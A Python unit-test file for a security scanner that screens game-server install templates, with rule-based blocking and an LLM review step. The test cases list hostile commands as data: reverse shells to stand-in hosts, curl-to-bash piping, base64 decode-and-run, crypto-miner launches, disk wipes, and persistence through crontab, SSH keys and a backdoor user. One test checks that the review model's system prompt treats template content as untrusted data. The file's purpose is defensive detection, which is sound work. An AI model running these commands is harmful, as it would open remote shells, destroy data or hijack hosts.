"""Tests for tools/security_check.py: python3 -m unittest discover -s tools -p "test_*.py" """
import json
import os
import sys
import unittest
from types import SimpleNamespace
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import security_check as sc  # noqa: E402


def template(commands=(), run="./server", env=None, host_config=None, steps=()):
    t = {
        "type": "test",
        "install": [{"type": "command", "commands": list(commands)}, *steps],
        "run": {"command": run, "environmentVars": env or {}},
        "environment": {"type": "docker", "image": "ubuntu:24.04"},
        "supportedEnvironments": [{"type": "docker", "image": "ubuntu:24.04", **({"hostConfig": host_config} if host_config else {})}],
    }
    return t


def findings(t, old=None):
    return sc.rule_findings("t", t, old)


def rules(t, level=None):
    return {f.rule for f in findings(t) if level is None or f.level == level}


class BlockRules(unittest.TestCase):
    def test_dangerous_commands_are_blocked(self):
        cases = {
            "reverse-shell": ["bash -i >& /dev/tcp/203.0.113.5/4444 0>&1", "nc -e /bin/sh evil.example 4444",
                              "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 80 > /tmp/f"],
            "pipe-to-shell": ["curl -fsSL https://get.example.sh | bash", "wget -qO- https://x.example/i.sh | sh",
                              "bash <(curl -s https://x.example/a)", "sh -c \"$(curl -fsSL https://x.example/a)\""],
            "decode-and-run": ["echo aGVsbG8= | base64 -d | sh", "eval \"$(echo ZWNobw== | base64 --decode)\""],
            "crypto-miner": ["./xmrig -o stratum+tcp://pool.example:3333", "wget https://github.com/x/xmrig/releases/x.tgz"],
            "wipe": ["rm -rf /", "rm -rf --no-preserve-root /", "rm -fr /etc", "dd if=/dev/zero of=/dev/sda"],
            "host-system": ["echo '* * * * * x' | crontab -", "echo key >> ~/.ssh/authorized_keys", "useradd backdoor",
                            "iptables -F", "curl --unix-socket /var/run/docker.sock http://x/containers/json"],
        }
        for rule, commands in cases.items():
            for cmd in commands:
                with self.subTest(cmd=cmd):
                    self.assertIn(rule, rules(template([cmd]), "block"))

    def test_privileged_container_and_preload_are_blocked(self):
        self.assertIn("docker-privileged", rules(template(host_config={"Privileged": True}), "block"))
        self.assertIn("sensitive-env", rules(template(env={"LD_PRELOAD": "/tmp/x.so"}), "block"))

    def test_a_written_script_is_checked_like_a_command(self):
        t = template(steps=[{"type": "writefile", "target": "start.sh", "text": "#!/bin/sh\ncurl https://x.example/p | sh\n"}])
        self.assertIn("pipe-to-shell", rules(t, "block"))

    def test_blocks_cannot_be_accepted_from_the_allow_list(self):
        with mock.patch.object(sc, "load_allow", return_value={("t", "pipe-to-shell", "install[0].commands[0]")}):
            self.assertIn("pipe-to-shell", rules(template(["curl https://x.example | sh"]), "block"))


class ReviewRules(unittest.TestCase):
    def test_unusual_things_go_to_review(self):
        cases = {
            "untrusted-host": ["curl -o server.jar https://files.unknown-host.example/server.jar"],
            "sudo": ["sudo apt-get install -y lib32gcc-s1"],
            "background": ["nohup ./helper &"],
            "setuid": ["chmod 777 /SkyPanel", "chmod u+s ./tool", "chmod 4755 ./tool"],
            "raw-ip": ["wget http://198.51.100.7/file.zip"],
            "eval": ["eval \"$EXTRA\""],
        }
        for rule, commands in cases.items():
            for cmd in commands:
                with self.subTest(cmd=cmd):
                    found = findings(template([cmd]))
                    self.assertIn(rule, {f.rule for f in found if f.level == "review"})
                    self.assertFalse(any(f.level == "block" for f in found), cmd)

    def test_download_steps_docker_settings_and_paths(self):
        t = template(steps=[{"type": "download", "files": ["https://cdn.unknown.example/a.zip"]},
                            {"type": "writefile", "target": "../../etc/x", "text": "x"}],
                     host_config={"NetworkMode": "host", "Init": True},
                     env={"LD_LIBRARY_PATH": "/usr/evil"})
        got = {(f.rule, f.detail) for f in findings(t)}
        self.assertIn(("untrusted-host", "cdn.unknown.example"), got)
        self.assertIn(("docker-setting", "NetworkMode"), got)
        self.assertIn(("sensitive-env", "LD_LIBRARY_PATH"), got)
        self.assertIn("path-outside", {r for r, _ in got})
        self.assertNotIn(("docker-setting", "Init"), got)

    def test_only_the_vendors_github_projects_are_trusted(self):
        trusted = [
            "curl -L -o Lavalink.jar https://github.com/lavalink-devs/Lavalink/releases/download/4.0.0/Lavalink.jar",
            "curl -o i.sh https://raw.githubusercontent.com/pmmp/get.pmmp.io/stable/installer.sh",
            "wget https://github.com/citizenfx/cfx-server-data/archive/refs/heads/master.zip",
            "git clone ${GIT_REPO} .", "curl -L https://github.com/${OWNER}/${REPO}/archive/main.zip",
        ]
        for cmd in trusted:
            with self.subTest(cmd=cmd):
                self.assertEqual(rules(template([cmd])), set())
        untrusted = {
            "curl -L -o x https://github.com/someone/tool/releases/download/1.0/tool": "someone/tool",
            "wget https://raw.githubusercontent.com/evil/scripts/main/run.sh": "evil/scripts",
            "curl https://api.github.com/repos/evil/x/tarball": "evil/x",
            "wget https://objects.githubusercontent.com/abc/def": "objects.githubusercontent.com",
        }
        for cmd, detail in untrusted.items():
            with self.subTest(cmd=cmd):
                got = {(f.rule, f.detail, f.level) for f in findings(template([cmd]))}
                self.assertIn(("github-project", detail, "review"), got)

    def test_a_githubdl_step_names_its_project(self):
        ok = template(steps=[{"type": "githubdl", "repository": "lavalink-devs/Lavalink", "assetMatch": "Lavalink.jar"}])
        self.assertEqual(rules(ok), set())
        other = template(steps=[{"type": "githubdl", "repository": "someone/server", "assetMatch": "x.jar"}])
        self.assertEqual({(f.rule, f.detail) for f in findings(other)}, {("github-project", "someone/server")})

    def test_the_allow_list_accepts_a_review_by_its_detail(self):
        cmd = "curl -o x https://files.unknown-host.example/x"
        with mock.patch.object(sc, "load_allow", return_value={("t", "untrusted-host", "files.unknown-host.example")}):
            self.assertEqual(rules(template([cmd])), set())


class NoFalseAlarms(unittest.TestCase):
    def test_everyday_template_content_passes(self):
        commands = [
            "bash -c \"for try in 1 2 3; do steamcmd +force_install_dir /SkyPanel +login anonymous +app_update 2394010 validate +quit && exit 0; sleep 15; done; exit 1\"",
            "curl -fsSL -o server.jar https://api.papermc.io/v2/projects/paper/versions/1.21/builds/1/downloads/paper.jar",
            "wget https://github.com/lavalink-devs/Lavalink/releases/download/4.0.0/Lavalink.jar",
            "rm -f Lavalink.jar", "rm -rf node_modules", "rm -rf /SkyPanel/cache",
            "chmod +x ./PalServer.sh", "./PalServer.sh -port=8211 -queryport=27015 -players=32",
            "npm install --no-audit --no-fund", "pip install -r requirements.txt",
            "curl -o x.zip https://${DOWNLOAD_HOST}/x.zip",
        ]
        t = template(commands, env={"LD_LIBRARY_PATH": "./linux64:$LD_LIBRARY_PATH", "PORT": "${port}"},
                     host_config={"Init": True},
                     steps=[{"type": "writefile", "target": "/Servers/x/Commands.dat", "text": "Port 27015\n"}])
        self.assertEqual([(f.rule, f.text) for f in findings(t)], [])

    def test_the_scan_reads_every_template(self):
        # whether the templates pass is the security check's job (its own workflow step), not
        # the tests': a pull request with a review finding must still reach that step
        self.assertIn(sc.main(["--all", "--no-ai"]), (0, 1))


class OnlyWhatChanged(unittest.TestCase):
    def test_content_the_old_version_had_is_not_checked_again(self):
        old = template(["sudo apt-get install -y x"])
        new = template(["sudo apt-get install -y x", "nohup ./y &"])
        self.assertEqual({f.rule for f in findings(new, old)}, {"background"})


class AIReview(unittest.TestCase):
    def fake_post(self, answer=None, error=None):
        calls = []

        def post(url, token, body):
            calls.append({"url": url, "token": token, "body": body})
            if error:
                raise error
            if answer is not None:
                return answer
            return {"success": True, "errors": [], "result": {"response": {"verdict": "safe", "summary": "Descarga del fabricante.", "findings": []}}}

        return post, calls

    def review(self, post):
        t = template(["sudo apt-get install -y x"])
        with mock.patch.dict(os.environ, {"CLOUDFLARE_ACCOUNT_ID": "acc123", "CLOUDFLARE_API_TOKEN": "tok"}, clear=True):
            return sc.ai_review("t", t, None, findings(t), post=post)

    def test_safe_verdict_and_request_shape(self):
        post, calls = self.fake_post()
        self.assertEqual(self.review(post)["verdict"], "safe")
        call = calls[0]
        self.assertEqual(call["url"], "https://api.cloudflare.com/client/v4/accounts/acc123/ai/run/@cf/meta/llama-3.3-70b-instruct-fp8-fast")
        self.assertEqual(call["token"], "tok")
        body = call["body"]
        self.assertEqual(body["response_format"], {"type": "json_schema", "json_schema": sc.VERDICT_SCHEMA})
        self.assertEqual(body["messages"][0]["role"], "system")
        self.assertIn("untrusted data", body["messages"][0]["content"])
        self.assertIn("sudo apt-get install -y x", body["messages"][1]["content"])

    def test_a_dedicated_ai_token_wins(self):
        post, calls = self.fake_post()
        t = template(["sudo x"])
        env = {"CLOUDFLARE_ACCOUNT_ID": "a", "CLOUDFLARE_API_TOKEN": "pages", "CLOUDFLARE_AI_TOKEN": "ai"}
        with mock.patch.dict(os.environ, env, clear=True):
            sc.ai_review("t", t, None, findings(t), post=post)
        self.assertEqual(calls[0]["token"], "ai")

    def test_a_verdict_sent_as_text_is_read(self):
        text = json.dumps({"verdict": "unsafe", "summary": "Descarga desconocida.", "findings": []})
        post, _ = self.fake_post({"success": True, "result": {"response": text}})
        self.assertEqual(self.review(post)["verdict"], "unsafe")

    def test_problems_fail_closed(self):
        answers = [
            {"success": False, "errors": [{"code": 4006, "message": "daily free allocation exceeded"}]},
            {"success": True, "result": {"response": "not json"}},
            {"success": True, "result": {"response": {"verdict": "maybe", "summary": "x"}}},
            {"success": True, "result": {}},
            "not a dict",
        ]
        for answer in answers:
            with self.subTest(answer=answer):
                post, _ = self.fake_post(answer)
                self.assertEqual(self.review(post)["verdict"], "unsure")
        post, _ = self.fake_post(error=OSError("timeout"))
        self.assertEqual(self.review(post)["verdict"], "unsure")

    def test_without_credentials_review_findings_need_a_person(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            t = template(["sudo x"])
            self.assertEqual(sc.ai_review("t", t, None, findings(t))["verdict"], "unsure")


class Report(unittest.TestCase):
    def test_pass_and_fail(self):
        review = findings(template(["sudo x"]))
        block = findings(template(["curl https://x.example | sh"]))
        _, ok = sc.report([("a", [], None)])
        self.assertTrue(ok)
        _, ok = sc.report([("a", review, {"verdict": "safe", "summary": "ok", "findings": []})])
        self.assertTrue(ok)
        for verdict in ("unsure", "unsafe"):
            text, ok = sc.report([("a", review, {"verdict": verdict, "summary": "x", "findings": []})])
            self.assertFalse(ok)
            self.assertIn("Para aceptarlo: `t sudo", text)
        _, ok = sc.report([("a", block, None)])
        self.assertFalse(ok)


if __name__ == "__main__":
    unittest.main()
